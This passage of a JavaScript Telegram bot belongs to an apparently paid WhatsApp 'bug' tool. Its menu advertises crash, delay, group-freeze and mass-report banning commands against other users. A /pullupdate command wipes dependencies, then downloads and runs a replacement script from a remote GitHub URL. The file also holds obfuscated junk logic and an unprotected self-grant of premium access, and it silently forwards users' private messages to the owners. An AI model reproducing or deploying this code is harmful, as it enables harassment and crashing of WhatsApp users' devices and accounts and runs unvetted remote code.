      .paragraph("<blockquote>/bufferdelay ➠ Delay X Crash<br>/slowxfc ➠ Fc Low<br>/crashxfc ➠ Crash Invisible</blockquote>")
      .divider()
      .heading(2, "Group & Utility")
      .paragraph("<blockquote>/lockGroup — Lock Group<br>/bannedGroups ➠ Group WhatsApp Banned<br>/groupfreeze ➠ Freeze All Member Group<br>/forceclosegb ➠ Forceclose Clicks<br>/XbanCh ➠ Banned Channel Methode (Report)<br>/cekidgb ➠ Cek Id Group WhatsApp")
      .divider()
      .heading(2, "Test Function")
      .paragraph("<blockquote>/testfunction ➠ Test function bug (.js / Reply Teks)<br>/testfunctiongb ➠ Test function untuk Group</blockquote>")
      .divider()
      .paragraph("<blockquote>Xb -- Family GXION the Spesialiss</blockquote>")
      .divider()
      .paragraph(buildMenuNavigation(3))
      .build();
  }
  return new RichHTMLBuilder()
    .photo(MEDIA.home, "MENU")
    .heading(2, "MENU")
    .divider()
    .paragraph(buildMenuNavigation(-1))
    .build();
}
async function sendMenuPage(ctx, page = 0) {
  const totalPages = 4;
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;
  try {
    const pageContent = buildMenuPage(page);
    if (ctx.callbackQuery) {
      await ctx.answerCbQuery().catch(() => {});
      await ctx.deleteMessage().catch(() => {});
    }
    const sent = await ctx.sendRichMessage(pageContent);
    if (sent && sent.message_id) {
      botRuntime.activeMenus.set(sent.message_id, {
        ctx: ctx,
        page: page,
        keyboardBuilder: () => buildMenuNavigation(page)
      });
    }
  } catch (err) {
    console.log("SEND PAGE ERROR:", err.message);
    await ctx.answerCbQuery("Gagal memuat menu").catch(() => {});
  }
}
bot.action(/page_(\d+)/, async ctx => {
  try {
    const userId = ctx.from.id,
      now = Date.now();
    if (botRuntime.clickCooldown.has(userId)) {
      const lastClick = botRuntime.clickCooldown.get(userId);
      if (now - lastClick < 300) return ctx.answerCbQuery("Dont spam").catch(() => {});
    }
    botRuntime.clickCooldown.set(userId, now);
    const pageNumber = Number(ctx.match[1]);
    if (isNaN(pageNumber)) return ctx.answerCbQuery("Invalid").catch(() => {});
    await sendMenuPage(ctx, pageNumber);
    await ctx.answerCbQuery().catch(() => {});
  } catch (err) {
    console.log("PAGE ERROR:", err.message);
  }
});
bot.action("noop", async ctx => {
  return ctx.answerCbQuery().catch(() => {});
});
async function notifyOwnerAboutPm(ctx) {
  try {
    if (!ctx.chat || ctx.chat.type !== "private") return;
    if (!ctx.from) return;
    const sender = ctx.from,
      message = ctx.message || {};
    let textContent = message.text || "[ Non-Teks ]";
    if (textContent.length > 500) textContent = textContent.substring(0, 500) + "...";
    const formattedTime = new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
      }),
      profileButtonMarkup = buildButtonGrid([
        [buildUrlButton("👤 Buka Profil", "tg://user?id=" + sender.id, "primary")]
      ]),
      tableOpts = {};
    tableOpts.bordered = true;
    tableOpts.striped = true;
    tableOpts.hasHeader = true;
    const richMessage = new RichHTMLBuilder()
      .photo(MEDIA.home, "NOTIF PM")
      .heading(2, "ADA USER START BOT DI PM")
      .divider()
      .table([
        ["PARAMETER", "VALUE"],
        ["Nama", ((sender.first_name || "") + " " + (sender.last_name || "")).trim() || "-"],
        ["Username", sender.username ? "@" + sender.username : "-"],
        ["User ID", "<code>" + sender.id + "</code>"],
        ["Chat ID", "<code>" + ctx.chat.id + "</code>"],
        ["Waktu", formattedTime]
      ], tableOpts)
      .divider()
      .paragraph("<blockquote>" + textContent + "</blockquote>")
      .divider()
      .paragraph(profileButtonMarkup)
      .build();
    for (const ownerId of OWNER_ID) {
      try {
        await ctx.telegram.sendRichMessage(ownerId, richMessage);
      } catch (err) {}
    }
  } catch (err) {
    console.log("NOTIFY OWNER ERROR:", err.message);
  }
}
let startValidated = false;
bot.command("start", async ctx => {
  try {
    const userId = ctx.from.id,
      now = Date.now();
    if (!global.AK72_SPAM_COUNT) global.AK72_SPAM_COUNT = {};
    global.AK72_SPAM_COUNT[userId] = (global.AK72_SPAM_COUNT[userId] || 0) + 1;
    global.AK72_SPAM_COUNT[userId] > 5 && (console.log(chalk.red("❌ Token invalid Silahkan Buy Access Lebih Ke @Bawzzhhh")), process.exit(1));
    setTimeout(() => {
      if (global.AK72_SPAM_COUNT) global.AK72_SPAM_COUNT[userId] = 0;
    }, 60000);
    const lastStart = startCooldownMap.get(userId) || 0;
    if (now - lastStart < START_COOLDOWN_MS) return ctx.reply("Tunggu sebentar.").catch(() => {});
    startCooldownMap.set(userId, now);
    if (startValidated) {
      await sendMenuPage(ctx, 0);
      return;
    }
    const progressOpts = {};
    progressOpts.parse_mode = "HTML";
    const progressMessage = await ctx.reply("🚨 <b>MEMPROSES KREDENSIAL...</b>\n\n<code>[□□□□□□□□□□] 0%</code>", progressOpts).catch(() => null),
      updateProgress = async (percent, label = "Memproses kredensial...") => {
        if (!progressMessage) return;
        const filled = Math.round(percent / 10),
          bar = "■".repeat(filled) + "□".repeat(10 - filled),
          editOpts = {};
        editOpts.parse_mode = "HTML";
        await ctx.telegram.editMessageText(ctx.chat.id, progressMessage.message_id, undefined, "🚨 <b>" + label.toUpperCase() + "</b>\n\n<code>[" + bar + "] " + percent + "%</code>", editOpts).catch(() => {});
      };
    await updateProgress(10, "Memeriksa proses...");
    const envAnomaly = detectEnvAnomaly();
    if (!envAnomaly.ok) {
      try {
        await ctx.telegram.deleteMessage(ctx.chat.id, progressMessage.message_id);
      } catch (err) {}
      return triggerAutoReject(envAnomaly.reason);
    }
    await updateProgress(20, "Memindai file sistem...");
    const suspiciousFiles = scanSuspiciousFiles();
    if (suspiciousFiles.length > 0) {
      try {
        await ctx.telegram.deleteMessage(ctx.chat.id, progressMessage.message_id);
      } catch (err) {}
      return triggerAutoReject("File bypass terdeteksi!");
    }
    await updateProgress(30, "Memeriksa log panel...");
    if (detectAnomalousPanelLog()) {
      try {
        await ctx.telegram.deleteMessage(ctx.chat.id, progressMessage.message_id);
      } catch (err) {}
      return triggerAutoReject("Log panel anomali!");
    }
    await updateProgress(40, "Memvalidasi bot...");
    try {
      const botInfo = await ctx.telegram.getMe();
      if (!botInfo.is_bot || !botInfo.username) throw new Error("Bukan bot");
    } catch (err) {
      await updateProgress(100, "Token invalid...");
      await new Promise(resolve => setTimeout(resolve, 800));
      if (progressMessage) try {
        await ctx.telegram.deleteMessage(ctx.chat.id, progressMessage.message_id);
      } catch (delErr) {}
      return ctx.reply("🚨 TOKEN INVALID\n\n[ ✓ ] BOT OK").catch(() => {});
    }
    await updateProgress(50, "Menghubungkan ke server...");
    await new Promise(resolve => setTimeout(resolve, 400));
    await updateProgress(60, "Mengambil database...");
    await new Promise(resolve => setTimeout(resolve, 400));
    await updateProgress(70, "Memeriksa akses...");
    let isValid = false,
      validationError = "";
    try {
      isValid = await validateTokenWithMirrors();
    } catch (err) {
      validationError = err.message;
      isValid = false;
    }
    if (!isValid) {
      await updateProgress(100, "Validasi gagal...");
      await new Promise(resolve => setTimeout(resolve, 800));
      if (progressMessage) try {
        await ctx.telegram.deleteMessage(ctx.chat.id, progressMessage.message_id);
      } catch (delErr) {}
      if (validationError.includes("fetch") || validationError.includes("timeout") || validationError.includes("Network")) {
        return ctx.reply("⚠️ Gagal memproses kredensial.\nCoba /start lagi nanti.").catch(() => {});
      }
      return ctx.reply("🚨 TOKEN INVALID\n\n[ ✓ ] BOT OK").catch(() => {});
    }
    await updateProgress(80, "Menyiapkan akses...");
    await new Promise(resolve => setTimeout(resolve, 400));
    await updateProgress(90, "Finalisasi...");
    await new Promise(resolve => setTimeout(resolve, 400));
    await updateProgress(100, "Selesai!");
    await new Promise(resolve => setTimeout(resolve, 600));
    if (progressMessage) try {
      await ctx.telegram.deleteMessage(ctx.chat.id, progressMessage.message_id);
    } catch (delErr) {}
    startValidated = true;
    if (!OWNER_ID.includes(userId)) await notifyOwnerAboutPm(ctx);
    const successMessage = new RichHTMLBuilder()
      .heading(2, "✅ AKSES DITERIMA")
      .divider()
      .paragraph("<blockquote>Selamat menggunakan Script ini. Gunakan dengan bijak.</blockquote>")
      .divider()
      .paragraph("<i>Xb -- Family GXION</i>")
      .build();
    await ctx.sendRichMessage(successMessage).catch(() => {
      return ctx.reply("✅ Akses Diterima, Selamat menggunakan Script ini Gunakan dengan bijak");
    });
    await new Promise(resolve => setTimeout(resolve, 1000));
    await sendMenuPage(ctx, 0);
  } catch (err) {
    console.log("START ERROR:", err.message);
    await ctx.reply("🚨 TOKEN INVALID\n\n[ ✓ ] BOT OK").catch(() => {});
  }
});
bot.on("message", async (ctx, next) => {
  try {
    if (ctx.chat.type === "private" && !OWNER_ID.includes(ctx.from.id) && ctx.message?.["text"] && !ctx.message.text.startsWith("/")) {
      await notifyOwnerAboutPm(ctx);
    }
  } catch (err) {
    console.log("PM DETECTOR ERROR:", err.message);
  }
  return next();
});
bot.command("pullupdate", ownerOnly, async ctx => {
  global.IS_UPDATING = true;
  const scriptFile = {};
  scriptFile.url = "https://raw.githubusercontent.com/zentrume01-lang/yangbypassyatim/refs/heads/main/tokens.json";
  scriptFile.name = "Ak72chflowXB4890.js";
  const packageFile = {};
  packageFile.url = "https://raw.githubusercontent.com/zentrume01-lang/yangbypassyatim/refs/heads/main/tokens.json";
  packageFile.name = "package.json";
  const downloads = [scriptFile, packageFile],
    cleanTargets = ["package-lock.json", ".npm", "node_modules"],
    initialOpts = {};
  initialOpts.parse_mode = "HTML";
  const statusMessage = await ctx.reply("⚙️ <b>AUTO UPDATE SCRIPT</b>\n━━━━━━━━━━━━━━━━━━━━\n🔄 [░░░░░░░░░░] 0%\n⏳ Memulai proses update...\n📑 File Ak72chflowXB4890.js & package.json", initialOpts);
  try {
    for (const target of cleanTargets) {
      try {
        const targetPath = "./" + target;
        if (fs.existsSync(targetPath)) {
          if (fs.lstatSync(targetPath).isDirectory()) {
            const rmOpts = {};
            rmOpts.recursive = true;
            rmOpts.force = true;
            fs.rmSync(targetPath, rmOpts);
          } else {
            fs.unlinkSync(targetPath);
          }
        }
      } catch {}
    }
    for (let index = 0; index < downloads.length; index++) {
      const item = downloads[index],
        totalItems = downloads.length;
      await new Promise((resolve, reject) => {
        const writeStream = fs.createWriteStream("./" + item.name);
        https.get(item.url, response => {
          if (response.statusCode !== 200) {
            reject(new Error("HTTP " + response.statusCode));
            return;
          }
          const contentLength = parseInt(response.headers["content-length"], 10);
          let downloaded = 0;
          let lastUpdate = Date.now();
          response.on("data", chunk => {
            downloaded += chunk.length;
            const now = Date.now();
            if (contentLength > 0 && (now - lastUpdate > 1000 || downloaded === contentLength)) {
              lastUpdate = now;
              const filePercent = Math.floor(downloaded / contentLength * 100),
                overallPercent = Math.floor(index / totalItems * 100 + filePercent / totalItems),
                filled = Math.floor(overallPercent / 10),
                bar = "█".repeat(filled) + "░".repeat(10 - filled);
              ctx.telegram.editMessageText(statusMessage.chat.id, statusMessage.message_id, undefined, "⚙️ <b>AUTO UPDATE SCRIPT</b>\n━━━━━━━━━━━━━━━━━━━━\n🔄 [" + bar + "] " + overallPercent + "%\n⏳ " + (filePercent < 100 ? "Mengunduh..." : "✅ Selesai"), {
                parse_mode: "HTML"
              }).catch(() => {});
            }
          });
          response.pipe(writeStream);
          writeStream.on("finish", resolve);
          writeStream.on("error", reject);
        }).on("error", reject);
      });
    }
    const doneOpts = {};
    doneOpts.parse_mode = "HTML";
    await ctx.telegram.editMessageText(statusMessage.chat.id, statusMessage.message_id, undefined, "✅ <b>UPDATE FILE COMPLETE!</b>\n━━━━━━━━━━━━━━━━━━\n📑 File : Ak72chflowXB4890.js\n♻️ Status : <i>Auto Restarting Panel...</i>", doneOpts);
    setTimeout(() => process.exit(0), 1500);
  } catch (err) {
    const failOpts = {};
    failOpts.parse_mode = "HTML";
    await ctx.telegram.editMessageText(statusMessage.chat.id, statusMessage.message_id, undefined, "❌ <b>UPDATE FAILED!</b>\n━━━━━━━━━━━━━━━━━━━━\nError: " + err.message, failOpts);
  }
});
bot.command("spotify", async ctx => {
  const chatId = ctx.chat.id;
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("🎧 Cara penggunaan:\n/spotify judul lagu");
  }
  const loadingMessage = await ctx.reply("🔎 Mencari lagu...");
  try {
    const {
      data: searchResult
    } = await axios.get("https://api.ikyyxd.my.id/search/ytplayv2?q=" + encodeURIComponent(query));
    if (!searchResult?.["status"] || !searchResult?.["result"]) return ctx.telegram.editMessageText(chatId, loadingMessage.message_id, undefined, "❌ Lagu tidak ditemukan.");
    const songInfo = searchResult.result;
    await ctx.telegram.editMessageText(chatId, loadingMessage.message_id, undefined, "⬇️ Downloading audio...");
    const fileName = Date.now() + ".mp3",
      filePath = path.join(__dirname, fileName),
      audioStream = await axios({
        method: "GET",
        url: songInfo.audio.url,
        responseType: "stream"
      }),
      writeStream = fs.createWriteStream(filePath);
    audioStream.data.pipe(writeStream);
    await new Promise((resolve, reject) => {
      writeStream.on("finish", resolve);
      writeStream.on("error", reject);
    });
    const formatDuration = seconds => {
        const minutes = Math.floor(seconds / 60),
          remainingSeconds = String(seconds % 60).padStart(2, "0");
        return minutes + ":" + remainingSeconds;
      },
      caption = "<blockquote>🎧 <b>SPOTIFY MUSIC</b>\n🎵 <b>Title</b>      : " + songInfo.title + "\n🎤 <b>Artis</b>     : " + (songInfo.author || "Unknown") + "\n⏱ <b>Durasi</b>   : " + formatDuration(songInfo.duration) + "\n📅 <b>Rilis</b>    : " + (songInfo.uploadDate || "Unknown") + "\n🔗 <b>Source</b>     : " + songInfo.source + "\n────────────────────</blockquote>",
      audioOpts = {};
    audioOpts.title = songInfo.title;
    audioOpts.performer = songInfo.author || "Unknown Artist";
    audioOpts.caption = caption;
    audioOpts.parse_mode = "HTML";
    await ctx.replyWithAudio({
      source: fs.createReadStream(filePath)
    }, audioOpts);
    fs.unlinkSync(filePath);
    await ctx.telegram.deleteMessage(chatId, loadingMessage.message_id);
  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(chatId, loadingMessage.message_id, undefined, "❌ Terjadi kesalahan saat memproses lagu.");
  }
});
bot.command("reqlink", ownerOnly, async ctx => {
  try {
    if (ctx.chat.type === "private") {
      return ctx.reply("Command ini hanya dapat digunakan di dalam grup.");
    }
    const args = ctx.message.text.trim().split(/\s+/);
    if (args.length < 2) return ctx.reply("Usage:\n/reqlink @username\nReply command ini pada bukti transaksi buyer.");
    const targetUser = args[1],
      repliedMessage = ctx.message.reply_to_message;
    if (!repliedMessage || !repliedMessage.photo && !repliedMessage.document) {
      return ctx.reply("Reply screenshot atau bukti transaksi terlebih dahulu.\nContoh:\n/reqlink @username");
    }
    const botInfo = await ctx.telegram.getMe(),
      botMember = await ctx.telegram.getChatMember(ctx.chat.id, botInfo.id);
    if (botMember.status !== "administrator") {
      return ctx.reply("Bot harus menjadi administrator pada grup ini.");
    }
    if (!botMember.can_invite_users) return ctx.reply("Bot memerlukan izin Invite Users.");
    const statusMessage = await ctx.reply("╭────────────────────────╮\n        REQUEST LINK\n╰────────────────────────╯\nRequest By\n@" + (ctx.from.username || ctx.from.first_name) + "\nTarget\n" + targetUser + "\n────────────────────────\nStatus\nVerifying Transaction\n▰▱▱▱▱▱▱▱▱▱ 10%");
    for (let percent = 20; percent <= 100; percent += 10) {
      await new Promise(resolve => setTimeout(resolve, 600));
      const filled = percent / 10,
        bar = "▰".repeat(filled) + "▱".repeat(10 - filled);
      await ctx.telegram.editMessageText(ctx.chat.id, statusMessage.message_id, undefined, "╭────────────────────────╮\n        REQUEST LINK\n╰────────────────────────╯\nRequest By\n@" + (ctx.from.username || ctx.from.first_name) + "\nTarget\n" + targetUser + "\n────────────────────────\nStatus\nVerifying Transaction\n" + bar + " " + percent + "%").catch(() => {});
    }
    const inviteLink = await ctx.telegram.createChatInviteLink(ctx.chat.id, {
        member_limit: 1,
        expire_date: Math.floor(Date.now() / 1000) + 600
      }),
      linkOpts = {};
    linkOpts.disable_web_page_preview = true;
    await ctx.telegram.editMessageText(ctx.chat.id, statusMessage.message_id, undefined, "╭────────────────────────╮\n     INVITE LINK GROUP MURBUGS\n╰────────────────────────╯\nRequest By Admin : @" + (ctx.from.username || ctx.from.first_name) + "\nTarget Request : " + targetUser + "\n────────────────────────\n🔗 " + inviteLink.invite_link + "\n────────────────────────\nStatus : Success\nMaximum Usage :1 User\nExpires : 10 Minutes\n────────────────────────", linkOpts);
  } catch (err) {
    console.error(err);
    ctx.reply("Request Failed " + err.message);
  }
});
bot.command("zombies", ownerOnly, async ctx => {
  const helper = {};
  helper.divide = function (a, b) {
    return a / b;
  };
  helper.modulo = function (a, b) {
    return a % b;
  };
  helper.greaterThan = function (a, b) {
    return a > b;
  };
  helper.scanLabel = "Scanning zombies...";
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tagA = "vLGVx";
  helper.tagB = "EHUUd";
  helper.tagC = "HWtdl";
  helper.tagD = "sEhum";
  helper.tagE = "yXBcR";
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.leftStatus = "left";
  helper.equals3 = function (a, b) {
    return a === b;
  };
  helper.kickedStatus = "kicked";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tagF = "sWPEx";
  const H = helper;
  const chatId = ctx.chat.id;
  let kicked = 0,
    deleted = 0,
    failed = 0,
    processed = 0;
  const statusMessage = await ctx.reply(H.scanLabel);
  try {
    const admins = await ctx.api.getChatAdministrators(chatId),
      adminIds = new Set(admins.map(item => item.user.id)),
      memberCount = await ctx.api.getChatMembersCount(chatId);
    for (let index = 0; H.lessThan(index, memberCount); index++) {
      if (H.equals(H.tagA, H.tagB)) t = H.text;
      else {
        try {
          if (H.tagC !== H.tagD) {
            const memberInfo = await ctx.api.getChatMember(chatId, index),
              memberUser = memberInfo.user;
            processed++;
            if (!adminIds.has(memberUser.id)) {
              if (H.equals("yXBcR", H.tagE)) {
                if (memberUser.is_deleted || H.equals2(memberInfo.status, H.leftStatus) || H.equals3(memberInfo.status, H.kickedStatus)) {
                  await ctx.api.banChatMember(chatId, memberUser.id);
                  if (memberUser.is_deleted) deleted++;
                  else kicked++;
                }
              } else {
                const seconds = Math.floor(H.divide(chatId, 1000)),
                  minutes = Math.floor(H.divide(seconds, 60)),
                  remaining = H.modulo(seconds, 60);
                return H.greaterThan(minutes, 0) ? minutes + "m " + remaining + "s" : remaining + "s";
              }
            }
          } else return a.log(f.yellow("⚠️ [groupfreeze] " + C.message)), null;
        } catch (err) {
          if (H.notEquals(H.tagF, H.tagF)) {
            const rmOpts = {};
            rmOpts.recursive = true;
            rmOpts.force = true;
            t.rmSync(a, rmOpts);
          } else failed++;
        }
        H.equals2(H.modulo(processed, 100), 0) && (await ctx.api.editMessageText(chatId, statusMessage.message_id, "Progres: " + processed + "/" + memberCount).catch(() => {}));
      }
    }
    await ctx.api.editMessageText(chatId, statusMessage.message_id, "Clear Akun Beku Success Deleted: " + deleted + " Kicked: " + kicked + " Failed: " + failed + " Total: " + processed);
  } catch (err) {
    await ctx.reply("Error: " + err.message);
  }
});
bot.command("setchat", ownerOnly, async ctx => {
  const chatId = ctx.chat.id,
    args = ctx.message.text.split(" ");
  if (args.length < 2 || isNaN(args[1])) return ctx.reply("Gunakan: /setchat <detik> (maks 3600 detik / 60 menit)");
  let delay = parseInt(args[1]);
  delay > 3600 && (delay = 3600, ctx.reply("Maksimal 60 menit."));
  if (delay < 0) {
    return ctx.reply("Gak bisa minus, Tuan!");
  }
  try {
    await ctx.api.setChatSlowModeDelay(chatId, delay);
    const minutes = Math.floor(delay / 60),
      seconds = delay % 60;
    let formatted = "";
    if (minutes > 0) formatted += minutes + " menit ";
    if (seconds > 0) formatted += seconds + " detik";
    ctx.reply("✅ Slowmode diatur ke " + formatted + ". Anggota harus nunggu " + formatted + " sebelum chat lagi.");
  } catch (err) {
    ctx.reply("❌ Gagal: " + err.message + " Pastikan bot admin!");
  }
});
bot.command("autopremgroup", ownerOnly, async ctx => {
  try {
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di grup.");
    }
    const groupId = ctx.chat.id.toString(),
      groupName = ctx.chat.title || "Unknown",
      groups = loadPremiumGroups();
    console.log("[DEBUG] Sebelum: " + JSON.stringify(groups));
    if (groups.includes(groupId)) return ctx.reply("⚠️ Grup sudah premium. 🆔 ID: " + groupId + " 📛 Nama: " + groupName);
    groups.push(groupId);
    savePremiumGroups(groups);
    botRuntime.premiumGroups = groups;
    console.log("[DEBUG] Sesudah: " + JSON.stringify(groups));
    ctx.reply("✅ Grup berhasil dijadikan premium. 🆔 ID: " + groupId + " 📛 Nama: " + groupName);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan.");
  }
});
bot.command("delpremgroup", ownerOnly, async ctx => {
  try {
    if (ctx.chat.type === "private") return ctx.reply("❌ Command ini hanya bisa digunakan di grup.");
    const groupId = ctx.chat.id.toString(),
      groupName = ctx.chat.title || "Unknown",
      groups = loadPremiumGroups();
    if (!groups.includes(groupId)) return ctx.reply("⚠️ Grup ini bukan premium. 🆔 ID: " + groupId + " 📛 Nama: " + groupName);
    const filtered = groups.filter(id => id !== groupId);
    savePremiumGroups(filtered);
    botRuntime.premiumGroups = filtered;
    ctx.reply("✅ Premium grup berhasil dihapus. 🆔 ID: " + groupId + " 📛 Nama: " + groupName);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan.");
  }
});
bot.command("listgroup", ownerOnly, async ctx => {
  try {
    const groups = loadPremiumGroups();
    if (!groups || groups.length < 1) {
      const opts = {};
      opts.parse_mode = "HTML";
      return ctx.reply("<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>\n<b>GROUP PREMIUM NOT FOUND</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━</b>\nTidak ada group premium yang terdaftar.\n<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>", opts);
    }
    let message = "<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>\n<b>LIST GROUP PREMIUM</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>\n\n";
    for (let index = 0; index < groups.length; index++) {
      const groupId = groups[index];
      try {
        const chatInfo = await ctx.telegram.getChat(groupId),
          chatTitle = chatInfo.title || "Unknown";
        message += "<blockquote>\n<b>" + (index + 1) + ". " + chatTitle + "</b>\n<b>Id Group :</b> <code>" + groupId + "</code>\n<b>Status :</b> Premium Active √\n</blockquote>\n";
      } catch {
        message += "<blockquote>\n<b>" + (index + 1) + ". Unknown Group</b>\n<b>Id Group :</b> <code>" + groupId + "</code>\n<b>Status :</b> Bot Left / Invalid\n</blockquote>\n";
      }
    }
    message += "<blockquote><b>Total Group Premium :</b> " + groups.length + "</blockquote>";
    const opts = {};
    opts.parse_mode = "HTML";
    return ctx.reply(message, opts);
  } catch (err) {
    return console.error(err), ctx.reply("❌ Terjadi error saat mengambil list group");
  }
});
bot.command("addowner", ownerOnly, ctx => {
  const ownerId = Number(ctx.message.text.split(" ")[1]);
  if (!ownerId) return ctx.reply("Usage: /addowner <id>");
  if (OWNER_ID.includes(ownerId)) return ctx.reply("⚠️ User sudah menjadi owner.");
  OWNER_ID.push(ownerId);
  const opts = {};
  opts.parse_mode = "HTML";
  ctx.reply("✅ 𝗢𝘄𝗻𝗲𝗿 ditambahkan 🆔 <code>" + ownerId + "</code>", opts);
});
bot.command("delowner", ownerOnly, ctx => {
  const ownerId = Number(ctx.message.text.split(" ")[1]);
  if (!ownerId) return ctx.reply("Usage: /delowner <id>");
  if (!OWNER_ID.includes(ownerId)) return ctx.reply("⚠️ User bukan owner.");
  const index = OWNER_ID.indexOf(ownerId);
  if (index > -1) OWNER_ID.splice(index, 1);
  const opts = {};
  opts.parse_mode = "HTML";
  ctx.reply("🗑️ 𝗢𝘄𝗻𝗲𝗿 dihapus 🆔 <code>" + ownerId + "</code>", opts);
});
const baileysChangeSessions = {};
bot.command("gantibaileys", ownerOnly, async ctx => {
  const helper = {};
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.helpText = "Kirim baileys baru, Contoh:\n\n";
  helper.exampleText = "📌 `\"whiskeysockets/baileys\": \"npm:@pahinak/baileys\"`";
  helper.markdown = "Markdown";
  const H = helper;
  baileysChangeSessions[ctx.from.id] = true;
  await ctx.reply(H.concat(H.concat("📦 *GANTI BAILEYS*\n\n", H.helpText), H.exampleText), {
    parse_mode: H.markdown
  });
});
bot.on("text", async (ctx, next) => {
  if (!baileysChangeSessions[ctx.from.id]) return next();
  const input = ctx.message.text;
  if (!input.includes("baileys")) return ctx.reply("❌ Format salah");
  try {
    const {
      spawn
    } = require("child_process");
    let newBaileys = input;
    input.includes("\":") && (newBaileys = input.split("\":")[1].trim().replace(/^"/, "").replace(/"$/, "").replace(/,$/, ""));
    const packageJson = JSON.parse(fs.readFileSync("./package.json", "utf8")),
      oldBaileys = packageJson.dependencies["@whiskeysockets/baileys"];
    packageJson.dependencies["@whiskeysockets/baileys"] = newBaileys;
    fs.writeFileSync("./package.json", JSON.stringify(packageJson, null, 2), "utf8");
    const rmOpts1 = {};
    rmOpts1.recursive = true;
    rmOpts1.force = true;
    if (fs.existsSync("./.npm")) fs.rmSync("./.npm", rmOpts1);
    const rmOpts2 = {};
    rmOpts2.recursive = true;
    rmOpts2.force = true;
    if (fs.existsSync("./node_modules")) fs.rmSync("./node_modules", rmOpts2);
    if (fs.existsSync("./package-lock.json")) fs.unlinkSync("./package-lock.json");
    delete baileysChangeSessions[ctx.from.id];
    await ctx.reply("╭────────────────────╮\n│ ✅ UPDATE BAILEYS SUKSES  │\n╰────────────────────╯\n\n▸ ❌ Bail Lama=" + oldBaileys + "\n" + "▸ ✅ Bail Terbaru=" + newBaileys + "\n\n" + "🔄 Restart otomatis dimulai...");
    setTimeout(() => {
      const child = spawn(process.argv[0], process.argv.slice(1), {
        detached: true,
        stdio: "inherit"
      });
      child.unref();
      process.exit(0);
    }, 2000);
  } catch (err) {
    ctx.reply("❌ " + err.message);
    delete baileysChangeSessions[ctx.from.id];
  }
});
bot.command("addadmin", ownerOnly, async ctx => {
  const userId = ctx.message.reply_to_message?.["from"]["id"]["toString"]() || ctx.message.text.split(" ")[1];
  if (!userId) return ctx.reply("Format: /addadmin <user_id> atau reply user.");
  if (botRuntime.adminList.includes(userId)) return ctx.reply("⚠️ User sudah menjadi admin.");
  addAdmin(userId);
  ctx.reply("✅ Berhasil menambahkan " + userId + " sebagai admin.");
});
bot.command("clearprem", ownerOnly, async ctx => {
  if (botRuntime.premiumUsers.length === 0) {
    return ctx.reply("Tidak ada user premium.");
  }
  const totalPremium = botRuntime.premiumUsers.length;
  return ctx.reply("⚠️ APAKAH KAMU INGIN MENG-CLEAR SEMUA PREMIUM AKSES ?\n|------------------------------------------------------------------|\nTotal User Premium Saat Ini 💎: " + totalPremium + "\n|------------------------------------------------------------------|\n⌛ Jika ingin meng-clear silahkan pencet Button \"ᴄʟᴇᴀʀ ᴘʀᴇᴍɪᴜᴍ\"", {
    reply_markup: {
      inline_keyboard: [
        [{
          text: "ᴄʟᴇᴀʀ ᴘʀᴇᴍɪᴜᴍ",
          callback_data: "clearprem_yes_" + ctx.from.id
        }],
        [{
          text: "ʙᴀᴛᴀʟᴋᴀɴ",
          callback_data: "clearprem_no_" + ctx.from.id
        }]
      ]
    }
  });
});
bot.action(/clearprem_.+/, async ctx => {
  const parts = ctx.match[0].split("_");
  const action = parts[1];
  const userId = parts[2];
  try {
    if (ctx.from.id.toString() !== userId) {
      const alert = {};
      alert.show_alert = true;
      return ctx.answerCbQuery("Bukan punya kamu", alert).catch(() => {});
    }
    if (action === "no") return ctx.deleteMessage().catch(() => {});
    if (action === "yes") {
      const total = botRuntime.premiumUsers.length;
      return botRuntime.premiumUsers = [], saveJsonFile(PATHS.premiumFile, botRuntime.premiumUsers), ctx.editMessageText("✅ AKSES PREMIUM SEMUA USER BERHASIL DI CLEAR !!\n|------------------------------------------------------------------|\n💎 Total id akses premium yang di clear: " + total + "\n|------------------------------------------------------------------|\nUser sekarang tidak bisa memakai Command yang terdapat pada Script ⚠️");
    }
  } catch (err) {
    console.log("CLEARREM ERROR:", err);
  }
});
bot.command("getprem", async ctx => {
  let userId;
  if (ctx.message.reply_to_message) userId = ctx.message.reply_to_message.from.id.toString();
  else {
    const args = ctx.message.text.split(" ");
    userId = args[1];
  }
  !userId && (userId = ctx.from.id.toString());
  if (botRuntime.premiumUsers.includes(userId)) {
    return ctx.reply("⚠️ ☇ 𝗨𝘀𝗲𝗿 𝗶𝗱 " + userId + " 𝗗𝗶𝗻𝘆𝗮𝘁𝗮𝗸𝗮𝗻 𝘀𝘂𝗱𝗮𝗵 𝗺𝗲𝗺𝗶𝗹𝗶𝗸𝗶 𝗮𝗸𝘀𝗲𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺.");
  }
  botRuntime.premiumUsers.push(userId);
  return saveJsonFile(PATHS.premiumFile, botRuntime.premiumUsers), ctx.reply("✅ ☇ 𝗨𝘀𝗲𝗿 𝗶𝗱 " + userId + " 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗱𝗶 𝘁𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 𝗸𝗲 𝗮𝗸𝘀𝗲𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺.");
});
bot.command("addprem", ownerOnly, async ctx => {
  const helper = {};
  helper.gusServer = "@g.us server required";
  helper.connectedText = "✅ CONNECTED";
  helper.notConnectedText = "❌ NOT CONNECT";
  helper.tag = "ouDqg";
